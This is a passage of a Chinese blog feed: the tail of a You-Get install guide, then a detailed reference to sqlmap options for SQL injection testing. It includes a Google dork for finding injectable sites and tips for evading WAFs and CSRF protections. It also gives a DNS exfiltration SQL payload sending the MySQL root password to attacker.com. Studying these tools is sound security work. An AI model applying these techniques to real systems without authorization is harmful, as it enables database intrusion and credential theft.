安装</strong></p><pre class="line-numbers language-code"><code class="language-code">$ pip3 install ffmpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="1.jpg" alt></p><h4 id="You-Get安装"><a href="#You-Get安装" class="headerlink" title="You-Get安装"></a>You-Get安装</h4><pre class="line-numbers language-code"><code class="language-code">$ pip3 install you-get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="2.jpg" alt></p><h4 id="You-Get升级"><a href="#You-Get升级" class="headerlink" title="You-Get升级"></a>You-Get升级</h4><pre class="line-numbers language-code"><code class="language-code">$ pip3 install --upgrade you-get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="至此You-Get就安装完毕了-接下来让我们尝试下吧"><a href="#至此You-Get就安装完毕了-接下来让我们尝试下吧" class="headerlink" title="至此You-Get就安装完毕了.接下来让我们尝试下吧"></a>至此You-Get就安装完毕了.接下来让我们尝试下吧</h3><p>找一个视频 例如: 邓紫棋-光年之外 <a href="https://www.bilibili.com/bangumi/play/ep307677" target="_blank" rel="noopener">https://www.bilibili.com/bangumi/play/ep307677</a><br>打开命令行,进入一个你想存放视频的目录,例如</p><pre><code>cd d:/tmpyou-get https://www.bilibili.com/bangumi/play/ep307677</code></pre><p><img src="4.jpg" alt></p><p>下载成功<br><img src="5.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 视频工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 视频工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap-参数详解</title>
      <link href="/2019/04/04/sqlmap-can-shu-xiang-jie/"/>
      <url>/2019/04/04/sqlmap-can-shu-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><h3 id="option-选项"><a href="#option-选项" class="headerlink" title="option 选项"></a>option 选项</h3><h4 id="h-列出基础帮助信息并退出"><a href="#h-列出基础帮助信息并退出" class="headerlink" title="-h  列出基础帮助信息并退出"></a>-h  列出基础帮助信息并退出</h4><p>-hh 列出标准帮助信息并退出<br>–version 列出应用版本号并退出 </p><h5 id="（-h-hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。"><a href="#（-h-hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。" class="headerlink" title="（-h\hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。"></a>（-h\hh用于查询基本帮助信息和全量帮助信息，基本帮助信息列举常用几个语句，例如–wizard、-u、–level、–risk等。</h5><h4 id="v-0-6-详细级别0-6"><a href="#v-0-6-详细级别0-6" class="headerlink" title="-v 0-6   详细级别0-6"></a>-v 0-6   详细级别0-6</h4><h5 id="0、只显示python错误以及严重的信息。"><a href="#0、只显示python错误以及严重的信息。" class="headerlink" title="0、只显示python错误以及严重的信息。"></a>0、只显示python错误以及严重的信息。</h5><p>1、同时显示基本信息和警告信息。（默认）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。（建议使用此级别，可显示注入参数）<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页面。</p><h3 id="target-目标"><a href="#target-目标" class="headerlink" title="target 目标"></a>target 目标</h3><h4 id="d-DIRECT-直连数据库的连接字符"><a href="#d-DIRECT-直连数据库的连接字符" class="headerlink" title="-d DIRECT  直连数据库的连接字符"></a>-d DIRECT  直连数据库的连接字符</h4><h5 id="已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库"><a href="#已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库" class="headerlink" title="已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库"></a>已知目标数据库的时候使用-d，直连目标数据库，注意是小d，大D是指定要访问的目标的某个库</h5><h4 id="u-URL-–url-URL-目标URL"><a href="#u-URL-–url-URL-目标URL" class="headerlink" title="-u URL, –url=URL 目标URL"></a>-u URL, –url=URL 目标URL</h4><h5 id="直接使用sqlmap-网址的方式使用此参数，例如sqlmap-v3-u-www-potian-com"><a href="#直接使用sqlmap-网址的方式使用此参数，例如sqlmap-v3-u-www-potian-com" class="headerlink" title="直接使用sqlmap+网址的方式使用此参数，例如sqlmap -v3 -u www.potian.com"></a>直接使用sqlmap+网址的方式使用此参数，例如sqlmap -v3 -u <a href="http://www.potian.com" target="_blank" rel="noopener">www.potian.com</a></h5><h4 id="l-LOGFILE-从Burp或WebScarab代理日志文件中解析目标"><a href="#l-LOGFILE-从Burp或WebScarab代理日志文件中解析目标" class="headerlink" title="-l LOGFILE  从Burp或WebScarab代理日志文件中解析目标"></a>-l LOGFILE  从Burp或WebScarab代理日志文件中解析目标</h4><h5 id="当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。"><a href="#当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。" class="headerlink" title="当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。"></a>当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用此参数，使用绝对路径地址即可。</h5><h4 id="x-SITEMAPURL-扫描txt文件里的多个目标"><a href="#x-SITEMAPURL-扫描txt文件里的多个目标" class="headerlink" title="-x SITEMAPURL  扫描txt文件里的多个目标"></a>-x SITEMAPURL  扫描txt文件里的多个目标</h4><p>-m BULKFILE    从一个文件里加载http请求<br>-r REQUESTFILE 针对谷歌对目标url的处理结果<br>-g GOOGLEDORK  从INI配置文件里加载选项</p><h5 id="这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，"><a href="#这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，" class="headerlink" title="这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，"></a>这几个选项分别是从XML文件、txt文件、请求格式文档里读取目标信息或请求，</h5><p>使用较多的是-m，-g可以使用google的搜索结果，<br>例如，直接搜索uid=，查找具有此参数的站点，<br>直接使用sqlmap调用google结果，例：sqlmap -g inurl:php?uid=</p><h4 id="c-CONFIGFILE-从INI配置文件里加载选项"><a href="#c-CONFIGFILE-从INI配置文件里加载选项" class="headerlink" title="-c CONFIGFILE  从INI配置文件里加载选项"></a>-c CONFIGFILE  从INI配置文件里加载选项</h4><h5 id="自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项"><a href="#自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项" class="headerlink" title="自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项"></a>自行配置sqlmp参数，直接输入绝对路径和其他目标参数就可以使用复杂参数选项</h5><h3 id="Request-请求"><a href="#Request-请求" class="headerlink" title="Request 请求"></a>Request 请求</h3><p>这些选项用于指定如何连接目标URL的方法</p><h4 id="–method-METHOD-强制HTTP方法，如：PUT"><a href="#–method-METHOD-强制HTTP方法，如：PUT" class="headerlink" title="–method=METHOD  强制HTTP方法，如：PUT"></a>–method=METHOD  强制HTTP方法，如：PUT</h4><p>–data=DATA   通过post发送的数据字符串</p><h5 id="服务端允许的情况下，"><a href="#服务端允许的情况下，" class="headerlink" title="服务端允许的情况下，"></a>服务端允许的情况下，</h5><p>–method改变默认的http方法，和其他参数配合使用，<br>例如–data，改变为post然后推送数据</p><h4 id="–param-del-PARA-分割参数值字符"><a href="#–param-del-PARA-分割参数值字符" class="headerlink" title="–param-del=PARA  分割参数值字符"></a>–param-del=PARA  分割参数值字符</h4><h5 id="当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。"><a href="#当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。" class="headerlink" title="当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。"></a>当GET或POST的数据需要用其他字符分割测试参数的时候用到此参数。</h5><p>例： –param-del=”;”</p><h4 id="–cookie-COOKIE-http的cookie头部值"><a href="#–cookie-COOKIE-http的cookie头部值" class="headerlink" title="–cookie=COOKIE  http的cookie头部值"></a>–cookie=COOKIE  http的cookie头部值</h4><h5 id="已经获得cookie字符串的时候使用此参数指定cookie，"><a href="#已经获得cookie字符串的时候使用此参数指定cookie，" class="headerlink" title="已经获得cookie字符串的时候使用此参数指定cookie，"></a>已经获得cookie字符串的时候使用此参数指定cookie，</h5><p>cookie获得可考虑使用XSS攻击和嗅探、劫持类攻击。</p><h4 id="–cookie-del-COO-分割cookie值字符"><a href="#–cookie-del-COO-分割cookie值字符" class="headerlink" title="–cookie-del=COO  分割cookie值字符"></a>–cookie-del=COO  分割cookie值字符</h4><h5 id="参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，"><a href="#参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，" class="headerlink" title="参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，"></a>参数极少用，但一般情况下可对需要分隔的cookie字符进行切分，</h5><p>类似于–param-del参数，只是一个是cookie一个是参数。</p><h4 id="–load-cookies-L"><a href="#–load-cookies-L" class="headerlink" title="–load-cookies=L.."></a>–load-cookies=L..</h4><p>从Netscape/wget的格式文件里加载cookies</p><h5 id="指定绝对路径，从wget格式文件里load响应的cookies字符。"><a href="#指定绝对路径，从wget格式文件里load响应的cookies字符。" class="headerlink" title="指定绝对路径，从wget格式文件里load响应的cookies字符。"></a>指定绝对路径，从wget格式文件里load响应的cookies字符。</h5><h4 id="–drop-set-cookie"><a href="#–drop-set-cookie" class="headerlink" title="–drop-set-cookie"></a>–drop-set-cookie</h4><h5 id="忽略响应里的cookie设置"><a href="#忽略响应里的cookie设置" class="headerlink" title="忽略响应里的cookie设置"></a>忽略响应里的cookie设置</h5><p>此参数配合手动cookie参数使用，使用预先获得的cookie。</p><h4 id="–user-agent-AGENT-指定http的UA值"><a href="#–user-agent-AGENT-指定http的UA值" class="headerlink" title="–user-agent=AGENT  指定http的UA值"></a>–user-agent=AGENT  指定http的UA值</h4><p>–random-agent  随机选择UA值</p><h5 id="默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap-dev-xxxxxxx-http-sqlmap-org"><a href="#默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap-dev-xxxxxxx-http-sqlmap-org" class="headerlink" title="默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/.-dev-xxxxxxx(http://sqlmap.org)"></a>默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/<em>.</em>-dev-xxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</h5><p>可以使用–user-agent参数来指定想使用的UA，<br>同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。<br>当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入.<br>另外UA是绕过waf的参数，–user-agent= –random-agent这两个参数可对waf针对恶意ua的防控进行绕过</p><h4 id="–host-HOST"><a href="#–host-HOST" class="headerlink" title="–host=HOST"></a>–host=HOST</h4><h5 id="指定http请求中header里的的host头参数"><a href="#指定http请求中header里的的host头参数" class="headerlink" title="指定http请求中header里的的host头参数"></a>指定http请求中header里的的host头参数</h5><h4 id="–referer-REFERER"><a href="#–referer-REFERER" class="headerlink" title="–referer=REFERER"></a>–referer=REFERER</h4><h5 id="指定HTTP的referer头部值"><a href="#指定HTTP的referer头部值" class="headerlink" title="指定HTTP的referer头部值"></a>指定HTTP的referer头部值</h5><p>在请求中伪造referer，有些waf和安全产品等会对refer进行限制，<br>仅允许本站referer，当waf参数对referer进行了限制后，<br>可使用此参数进行绕过。当–level参数设定为3或者3以上的时候会尝试对referer注入</p><h4 id="–headers-HEADERS"><a href="#–headers-HEADERS" class="headerlink" title="–headers=HEADERS"></a>–headers=HEADERS</h4><h5 id="额外的头部"><a href="#额外的头部" class="headerlink" title="额外的头部"></a>额外的头部</h5><p>指定其他的header信息，XFF等，例如strust2-045试用了Content-Type</p><h4 id="–auth-type-AUTH"><a href="#–auth-type-AUTH" class="headerlink" title="–auth-type=AUTH.."></a>–auth-type=AUTH..</h4><h5 id="http验证类型-Basic-Digest-NTLM-or-PKI"><a href="#http验证类型-Basic-Digest-NTLM-or-PKI" class="headerlink" title="http验证类型 Basic, Digest, NTLM or PKI"></a>http验证类型 Basic, Digest, NTLM or PKI</h5><h4 id="–auth-cred-AUTH"><a href="#–auth-cred-AUTH" class="headerlink" title="–auth-cred=AUTH.."></a>–auth-cred=AUTH..</h4><h5 id="http验证-名字-密码"><a href="#http验证-名字-密码" class="headerlink" title="http验证 名字 密码"></a>http验证 名字 密码</h5><p>http验证类型，详细区别不在此赘述，可参考OAUTH验证详解</p><h4 id="–auth-private-A"><a href="#–auth-private-A" class="headerlink" title="–auth-private=A.."></a>–auth-private=A..</h4><h5 id="http验证-私钥文件"><a href="#http验证-私钥文件" class="headerlink" title="http验证 私钥文件"></a>http验证 私钥文件</h5><p>HTTP代理身份验证凭据，可自动使用username：password和秘钥文件，<br>例如有些访问会使用key，集团sso最爱出现此种场景</p><h4 id="–ignore-401"><a href="#–ignore-401" class="headerlink" title="–ignore-401"></a>–ignore-401</h4><h5 id="忽略http401错误，未授权的"><a href="#忽略http401错误，未授权的" class="headerlink" title="忽略http401错误，未授权的"></a>忽略http401错误，未授权的</h5><p>某些页面访问会返回未授权错误，可使用此参数进行忽略和跳过</p><h4 id="–proxy-PROXY-使用代理连接目标url"><a href="#–proxy-PROXY-使用代理连接目标url" class="headerlink" title="–proxy=PROXY  使用代理连接目标url"></a>–proxy=PROXY  使用代理连接目标url</h4><p>–proxy-cred=PRO..  代理验证证书 名字密码<br>–proxy-file=PRO.. 从文件里加载代理列表<br>–proxy-file=PRO.. 从文件里加载代理列表<br>–ignore-proxy  忽略系统默认代理设置</p><h5 id="当需要使用-g-inurl-php-uid-等参数时，默认无法访问，可使用此参数-海外代理方式使用此功能。"><a href="#当需要使用-g-inurl-php-uid-等参数时，默认无法访问，可使用此参数-海外代理方式使用此功能。" class="headerlink" title="当需要使用 -g inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。"></a>当需要使用 -g inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。</h5><p>当代理需要验证的时候，使用-cre指定身份信息，需要使用代理轮巡时，<br>使用文件加载代理设置列表，使用代理轮询也可在对访问ip次数进行了验证的场景使用。</p><h4 id="–tor-使用tor网络"><a href="#–tor-使用tor网络" class="headerlink" title="–tor  使用tor网络"></a>–tor  使用tor网络</h4><p>–tor-port=TORPORT  设置tor代理端口，非默认<br>–tor-type=TORTYPE  这只tor代理类型，http（默认）socks4 socks5<br>–check-tor  检查tor是否正常</p><h5 id="此参数不过多赘述，我也假装不懂。"><a href="#此参数不过多赘述，我也假装不懂。" class="headerlink" title="此参数不过多赘述，我也假装不懂。"></a>此参数不过多赘述，我也假装不懂。</h5><h4 id="–delay-DELAY-设置每个http请求之间的延时间隔"><a href="#–delay-DELAY-设置每个http请求之间的延时间隔" class="headerlink" title="–delay=DELAY  设置每个http请求之间的延时间隔"></a>–delay=DELAY  设置每个http请求之间的延时间隔</h4><h5 id="设置http请求间隔时间，在绕过需求时使用，"><a href="#设置http请求间隔时间，在绕过需求时使用，" class="headerlink" title="设置http请求间隔时间，在绕过需求时使用，"></a>设置http请求间隔时间，在绕过需求时使用，</h5><p>例如单ip单位时间访问多少次，可配合代理和多代理参数使用。</p><h4 id="–timeout-TIMEOUT-设置超时连接间隔，默认30S"><a href="#–timeout-TIMEOUT-设置超时连接间隔，默认30S" class="headerlink" title="–timeout=TIMEOUT  设置超时连接间隔，默认30S"></a>–timeout=TIMEOUT  设置超时连接间隔，默认30S</h4><p>–retries=RETRIES  超时后的尝试次数，默认三次</p><h5 id="超时连接后的尝试间隔，默认30s，"><a href="#超时连接后的尝试间隔，默认30s，" class="headerlink" title="超时连接后的尝试间隔，默认30s，"></a>超时连接后的尝试间隔，默认30s，</h5><p>可手动调整，一遍–timeout和–retries配合使用</p><h4 id="–randomize-RPARAM"><a href="#–randomize-RPARAM" class="headerlink" title="–randomize=RPARAM"></a>–randomize=RPARAM</h4><h5 id="随机改变参数值"><a href="#随机改变参数值" class="headerlink" title="随机改变参数值"></a>随机改变参数值</h5><p>可以设定某一个参数值在每一次请求中随机的变化，<br>长度和类型会与提供的初始值一样，<br>例如上文的–timeout和–retries</p><h4 id="–safe-url-SAFURL-在测试期间，经常去访问url地址"><a href="#–safe-url-SAFURL-在测试期间，经常去访问url地址" class="headerlink" title="–safe-url=SAFURL  在测试期间，经常去访问url地址"></a>–safe-url=SAFURL  在测试期间，经常去访问url地址</h4><p>–safe-freq=SAFREQ  在两次访问安全站点之间发送一个测试请求</p><h5 id="安全访问路径和请求配置用于伪造用户行为身份，"><a href="#安全访问路径和请求配置用于伪造用户行为身份，" class="headerlink" title="安全访问路径和请求配置用于伪造用户行为身份，"></a>安全访问路径和请求配置用于伪造用户行为身份，</h5><p>例如有些模型会验证你的行为路径，<br>可用此方法伪造行为，在攻击行为中夹杂正常访问行为。例如广告浏览、商品查看等。</p><h4 id="–skip-urlencode"><a href="#–skip-urlencode" class="headerlink" title="–skip-urlencode"></a>–skip-urlencode</h4><h5 id="跳过payload参数的编码数据"><a href="#跳过payload参数的编码数据" class="headerlink" title="跳过payload参数的编码数据"></a>跳过payload参数的编码数据</h5><p>跳过URL的有效载荷数据编码，前提是自编码</p><h4 id="–csrf-token-CSR-持有反csrf-token的参数"><a href="#–csrf-token-CSR-持有反csrf-token的参数" class="headerlink" title="–csrf-token=CSR.. 持有反csrf token的参数"></a>–csrf-token=CSR.. 持有反csrf token的参数</h4><p>–csrf-url=CSRFURL  从访问地址中提取反 csrf token</p><h5 id="针对CSRF-服务端通常使用客户端页面增加伪随机数。"><a href="#针对CSRF-服务端通常使用客户端页面增加伪随机数。" class="headerlink" title="针对CSRF,服务端通常使用客户端页面增加伪随机数。"></a>针对CSRF,服务端通常使用客户端页面增加伪随机数。</h5><p>常见的有以下三种方法<br>(1).Cookie Hashing(所有表单都包含同一个伪随机值)<br>(2).验证码<br>(3).One-Time Tokens(不同的表单包含一个不同的伪随机值)。<br>使用反csrf参数，可以对站点的csrf设置进行对抗和绕过</p><h4 id="–force-ssl"><a href="#–force-ssl" class="headerlink" title="–force-ssl"></a>–force-ssl</h4><h5 id="强制使用ssl-https"><a href="#强制使用ssl-https" class="headerlink" title="强制使用ssl/https"></a>强制使用ssl/https</h5><p>强制使用https，也可在url后面增加:443</p><h4 id="–eval-EVALCODE"><a href="#–eval-EVALCODE" class="headerlink" title="–eval=EVALCODE"></a>–eval=EVALCODE</h4><h5 id="请求之前执行提供的python代码后再提交请求（”import-hashlib-id2-hashlib-md5-id-hexdigest-”）"><a href="#请求之前执行提供的python代码后再提交请求（”import-hashlib-id2-hashlib-md5-id-hexdigest-”）" class="headerlink" title="请求之前执行提供的python代码后再提交请求（”import hashlib;id2=hashlib.md5(id).hexdigest()”）"></a>请求之前执行提供的python代码后再提交请求（”import hashlib;id2=hashlib.md5(id).hexdigest()”）</h5><p>有的网站会对提交的参数进行编码或加密，这时候需要根据某个参数的变化，<br>而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。<br>例子： –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”<br>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p><h3 id="Optimization-优化"><a href="#Optimization-优化" class="headerlink" title="Optimization 优化"></a>Optimization 优化</h3><p>这些选项用来优化sqlmap的性能</p><h4 id="o-打开所有的优化开关"><a href="#o-打开所有的优化开关" class="headerlink" title="-o  打开所有的优化开关"></a>-o  打开所有的优化开关</h4><p>–predict-output  预测常见的查询输出<br>–keep-alive  使用持久的http连接<br>–null-connection  在实际的http响应主题之外检索页面长度<br>–threads=THREADS  当前http请求最大值 默认1  就是最大并发</p><h3 id="Injection-注入"><a href="#Injection-注入" class="headerlink" title="Injection 注入"></a>Injection 注入</h3><p>这些选项用于指定测试那些参数，提供注入payload和篡改脚本</p><h4 id="p-TESTPARAMETER-测试参数"><a href="#p-TESTPARAMETER-测试参数" class="headerlink" title="-p TESTPARAMETER  测试参数"></a>-p TESTPARAMETER  测试参数</h4><p>–skip=SKIP  忽略测试指定的参数<br>–dbms=DBMS  指定数据库类型<br>–dbms-cred=DBMS.. 数据库验证凭据，用户名密码<br>–os=OS  指定操作系统类型<br>–invalid-bignum  对无效值使用大数值<br>–invalid-logical  对无效值使用逻辑操作<br>–invalid-string  对无效值使用随机字符<br>–no-cast  关闭payload生成机制<br>–no-escape  关闭payload字符串转译机制<br>–prefix=PREFIX  注入payload前缀字符<br>–suffix=SUFFIX  注入payload结尾字符<br>–tamper=TAMPER  使用指定的脚本篡改注入数据</p><h5 id="sqlmap默认测试所有的GET和POST参数，"><a href="#sqlmap默认测试所有的GET和POST参数，" class="headerlink" title="sqlmap默认测试所有的GET和POST参数，"></a>sqlmap默认测试所有的GET和POST参数，</h5><p>上文提到过，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，<br>大于等于3的时候也会测试User-Agent和HTTP Referer头的值。<br>这时候可以手动指定-p参数设置想要测试的参数。<br>例如： -p “id,cookie”但是有个别参数不想测试的时候可以使用–skip=“user-agent”参数。<br>目前sqlmapMySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库，<br>如果预知数据库类型和凭证，可使用  –dbms、 –dbms-cred=来制定数据库类型和数据库凭证。<br>同样当预知操作系统类型，可使用–os来指定操作系统类型，默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。<br>无效数值处理：<br>参数：–invalid-bignum –invalid-logical 这两个参数对报错数据、无效数据进行更改，<br>例如默认报错UID=-20,可以通过制定以上参数制定无效的大数字和逻辑，比如uid=999999999和uid=20 and a=b<br>参数：–prefix,–suffix在注入的payload的前面或者后面加一些字符，来保证payload的正常执行，<br>例如在语句中增加–prefix “’)” –suffix “AND (’1’=’1”<br>–tamper 可从tamper库里查找相关内容，使用 –tamper tamper/*.py方式指定</p><h3 id="Detection-侦查"><a href="#Detection-侦查" class="headerlink" title="Detection 侦查"></a>Detection 侦查</h3><p>这些选项用于侦测阶段的定制化</p><h4 id="–level-LEVEL"><a href="#–level-LEVEL" class="headerlink" title="–level=LEVEL"></a>–level=LEVEL</h4><h5 id="级别，从1-5，默认1"><a href="#级别，从1-5，默认1" class="headerlink" title="级别，从1-5，默认1"></a>级别，从1-5，默认1</h5><p>上文多次解释–level对测试参数的影响，一共有五个等级，<br>默认为1，sqlmap使用的payload可以在payloads.xml中看到，<br>你也可以根据相应的格式添加自己的payload内容，默认也有一些，可定制。<br>–level的值大于等于2的时候也会测试HTTP Cookie头的值，<br>大于等于3的时候也会测试User-Agent和HTTP Referer头的值，建议最高级别，会更慢、测试参数更复杂。</p><h4 id="–risk-RISK"><a href="#–risk-RISK" class="headerlink" title="–risk=RISK"></a>–risk=RISK</h4><h5 id="级别-0-3-默认1"><a href="#级别-0-3-默认1" class="headerlink" title="级别 0-3 默认1"></a>级别 0-3 默认1</h5><p>从0-3共有四个风险等级，<br>默认是1，risk1会测试大部分的测试语句，<br>2会增加基于事件的测试语句，<br>3会增加OR语句的注入测试。测试的语句同样可以在payloads.xml中找到，可以自行添加payload。<br>警告：当使用高级别时，可能会使用drop、update等高危语句对整表、整库造成影响，可能导致更新的整个表，可能造成很大的风险。</p><h4 id="–string-STRING-评估被证实为true时的匹配字符串"><a href="#–string-STRING-评估被证实为true时的匹配字符串" class="headerlink" title="–string=STRING  评估被证实为true时的匹配字符串"></a>–string=STRING  评估被证实为true时的匹配字符串</h4><p>–not-string=NOT..  评估被证实为falese的匹配字符串<br>–regexp=REGEXP  评估被证实为true时的匹配正则表达式<br>–code=CODE  评估被证实为true时的匹配http code<br>–text-only 仅比较页面的文本内容<br>–titles  仅比较页面的标题</p><h5 id="sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。"><a href="#sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。" class="headerlink" title="sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。"></a>sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。</h5><p>为了避免误报，可指定字符串或者正则表达式来区分原始页面和报错页面（–string参数添加字符串，–regexp添加正则）<br>也可以提供一段字符串在原始页面与true下的页面都不存在的字符串，而false页面中存在的字符串（–not-string添加）。<br>用户也可以提供true与false返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，–code=200。<br>参数：–text-only,–titles<br>想具体查询true和false下页面的差异位置，可以使用–text-only（HTTP文本内容）–titles（HTML的title标签）</p><h3 id="Techniques-技巧"><a href="#Techniques-技巧" class="headerlink" title="Techniques 技巧"></a>Techniques 技巧</h3><p>这些选项用于调整特定sql注入技术的技巧</p><h4 id="–technique-TECH"><a href="#–technique-TECH" class="headerlink" title="–technique=TECH"></a>–technique=TECH</h4><h5 id="sql注入方式："><a href="#sql注入方式：" class="headerlink" title="sql注入方式："></a>sql注入方式：</h5><p>默认把BEUSTQ全来一遍，可根据实际情况进行调整，<br>例如可使用时间延迟，看网站响应时间来判断是否有注入，可根据报错判断注入。如果不是很懂，就不用管，虽然时间长点，但很全面。<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）<br>Q: Inline SQL Injection  (内联注入)</p><h4 id="–time-sec-TIMESEC"><a href="#–time-sec-TIMESEC" class="headerlink" title="–time-sec=TIMESEC"></a>–time-sec=TIMESEC</h4><h5 id="数据库响应延时秒数-默认5"><a href="#数据库响应延时秒数-默认5" class="headerlink" title="数据库响应延时秒数 默认5"></a>数据库响应延时秒数 默认5</h5><p>当使用基于时间延迟注入的盲注时，<br>时刻使用–time-sec参数设定延时时间，默认是5秒，<br>可以根据环境记性调整，比如网络延迟很大，可适当增加延时时间</p><h4 id="–union-cols-UCOLS"><a href="#–union-cols-UCOLS" class="headerlink" title="–union-cols=UCOLS"></a>–union-cols=UCOLS</h4><h5 id="指定SQL注入查询的列的范围"><a href="#指定SQL注入查询的列的范围" class="headerlink" title="指定SQL注入查询的列的范围"></a>指定SQL注入查询的列的范围</h5><p>设定的值为一段整数范围，制定区间，此数值默认为1-10，<br>随着–levle增加，当为5的时候增加为50，<br>当level级别和取值范围不匹配，在低级别需求更大的范围，可通过设定–union-cols的值来实现。</p><h4 id="–union-char-UCHAR"><a href="#–union-char-UCHAR" class="headerlink" title="–union-char=UCHAR"></a>–union-char=UCHAR</h4><h5 id="指定暴力破解列数的字符"><a href="#指定暴力破解列数的字符" class="headerlink" title="指定暴力破解列数的字符"></a>指定暴力破解列数的字符</h5><p>设定union查询使用的字符，默认使用NULL，<br>但是可能会返回失败，–union-char指定UNION查询的字符。</p><h4 id="–union-from-UFROM"><a href="#–union-from-UFROM" class="headerlink" title="–union-from=UFROM"></a>–union-from=UFROM</h4><h5 id="指定sql注入查询的表"><a href="#指定sql注入查询的表" class="headerlink" title="指定sql注入查询的表"></a>指定sql注入查询的表</h5><p>指定查询的表，配合上文暴力破解的字符、范围等来详细使用。</p><h4 id="–dns-domain-DNS"><a href="#–dns-domain-DNS" class="headerlink" title="–dns-domain=DNS.."></a>–dns-domain=DNS..</h4><h5 id="指定用于DNS漏出攻击的域名"><a href="#指定用于DNS漏出攻击的域名" class="headerlink" title="指定用于DNS漏出攻击的域名"></a>指定用于DNS漏出攻击的域名</h5><p>DNS注入攻击不做过多解释，有机会详细解释一下，<br>实际就是通过DNS隐蔽通道和恶意代码来使web来执行解析参数导致信息泄露。<br>可通过sqlmap的语句进行查询使用，当指定此参数且具有注入漏洞的情况下，可更快速且影响更小的获得内容。<br>以下是使用MySQL的函数LOAD_FILE()将系统管理员的密码通过DNS解析机制传输的例子：<br>SELECTLOAD_FILE(CONCAT(‘\\\\’,(SELECT password FROM mysql.user WHERE user=’root’    LIMIT 1),’.attacker.com\\foobar’));</p><h4 id="–second-order-S"><a href="#–second-order-S" class="headerlink" title="–second-order=S.."></a>–second-order=S..</h4><h5 id="生成url搜索页面结果的二级响应"><a href="#生成url搜索页面结果的二级响应" class="headerlink" title="生成url搜索页面结果的二级响应"></a>生成url搜索页面结果的二级响应</h5><p>二次注入查询，当判断注入响应不是当前页面，<br>可使用此参数制定另一个页面来进行测试，<br>根据页面响应判断结果为true或false。</p><h3 id="Fingerprint-指纹"><a href="#Fingerprint-指纹" class="headerlink" title="Fingerprint 指纹"></a>Fingerprint 指纹</h3><h4 id="f-执行检查广泛的DBMS版本的指纹"><a href="#f-执行检查广泛的DBMS版本的指纹" class="headerlink" title="-f 执行检查广泛的DBMS版本的指纹"></a>-f 执行检查广泛的DBMS版本的指纹</h4><p>通过此参数来执行更广泛、详细的指纹识别</p><h3 id="Enumeration-枚举"><a href="#Enumeration-枚举" class="headerlink" title="Enumeration 枚举"></a>Enumeration 枚举</h3><p>这些选项可用于枚举后端数据库管理系统信息、表里的数据接口，此外还可以运行你的sql语句</p><h4 id="a-–all-检索所有"><a href="#a-–all-检索所有" class="headerlink" title="-a, –all   